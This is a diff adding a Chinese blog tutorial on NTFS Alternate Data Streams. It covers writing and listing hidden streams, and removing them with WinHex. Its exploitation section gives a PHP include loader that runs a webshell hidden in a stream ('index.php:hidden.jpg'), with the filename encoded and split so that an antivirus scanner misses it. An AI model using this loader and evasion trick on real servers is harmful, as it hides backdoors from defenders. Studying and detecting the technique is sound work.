@@ -380,7 +380,53 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          
+          <h3><span id="0x00介绍">0x00介绍</span></h3><p>Alternate DataStreams(ADS)</p>
+<p>换算成我学过的就是NTFS交换数据流。ADS是NTFS磁盘格式的一个特性，在NTFS文件系统中，每个文件都可以存在多个数据流。</p>
+<p>概念就那么一点直接看实例。</p>
+<p>比如说下面这个，我现在桌面新建一个test文件夹:</p>
+<p>然后使用命令:</p>
+<pre><code>echo 3628&gt;1.txt:flag.txt</code></pre><p><img src="/2021/08/20/Windows-ADS的妙用/image-20210820142921387.png" alt="image-20210820142921387"></p>
+<p>然后打开只有一个空的1.txt并没有写的3628的txt。</p>
+<p>这里就是ADS的利用，如何排查使用ADS隐藏的文件呢:</p>
+<p><img src="/2021/08/20/Windows-ADS的妙用/image-20210820143032408.png" alt="image-20210820143032408"></p>
+<p>使用dir /r即可看到，可以看到写进去的就是$DATA的流文件。</p>
+<p>但默认新建文本文档或者文件都没办法建一个以:$DATA结尾的文件。</p>
+<p>当然上面那种方式是以1.txt为寄宿文件，然后产生的数据流文件。</p>
+<p>也可以用文件夹:</p>
+<pre><code>echo &quot;test&quot;&gt;test:1.php
+当然也可以忽略文件夹:
+echo test&gt;:1.php</code></pre><p>这样就。。。找不到了只能看到那个文件夹。但是这种流文件在WinXp后都没有执行权限的。后面写webshell的利用。</p>
+<h3><span id="0x01利用">0x01利用</span></h3><p>主要利用在webshell的隐藏上，但由于无执行权限，以PHP为例，则需要文件包含，但一般的Include容易被查杀，因而换一个编码函数:</p>
+<pre><code class="php">&lt;?php @include(PACK(&#39;H*&#39;,&#39;696E6465782E7068703A68696464656E2E6A7067&#39;));?&gt;</code></pre>
+<p>这个能被查杀:</p>
+<p><img src="/2021/08/20/Windows-ADS的妙用/image-20210820154615186.png" alt="image-20210820154615186"></p>
+<pre><code class="php">&lt;?php 
+$a=&quot;696E6465782E7068703&quot;.&quot;A68696464656E2E6A7067&quot;;
+$b=&quot;a&quot;;
+include(PACK(&#39;H*&#39;,$$b))
+?&gt;</code></pre>
+<p>然后采用分节绕过一下:</p>
+<p>就扫不出来了。</p>
+<p>PACK函数用法:</p>
+<pre><code>pack(format,args+)
+其中format规定在包装数据时所使用的格式。args规定被包装的一个或多个参数
+pack()函数把数据装入一个二进制字符串。
+常用的H - HEX String hig nibble first
+其中format可以使用通配符*匹配例如。</code></pre><pre><code>&lt;?php
+echo pack(&quot;C3&quot;,80,72,80);
+?&gt;
+输出:PHP
+&lt;?php
+echo pack(&quot;C*&quot;,80,72,80);
+?&gt;
+echo PHP</code></pre><h3><span id="0x02防御">0x02防御</span></h3><p>如何检测和删除这种流文件？</p>
+<p>如果有宿主文件并且那个不是业务文件。那可以直接删除宿主文件。</p>
+<p><img src="/2021/08/20/Windows-ADS的妙用/image-20210820152357458.png" alt="image-20210820152357458"></p>
+<p>winhex的disk功能可以直接看到流文件然后删除。</p>
+<p><img src="/2021/08/20/Windows-ADS的妙用/image-20210820152423428.png" alt="image-20210820152423428"></p>
+<p>tools-&gt;open disk然后打开就发现了1.php。上面这个NTFS是代表磁盘的文件系统格式。</p>
+<p>选中右键删除即可清除。</p>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -408,9 +454,26 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2021/09/16/sql深度利用/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                sql深度利用</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
         
           
-            <div class="post-nepre full next">
+            <div class="post-nepre half next">
           
             <a href="/2021/08/19/Java-HashMap学习/" rel="next">
               <div class="background">
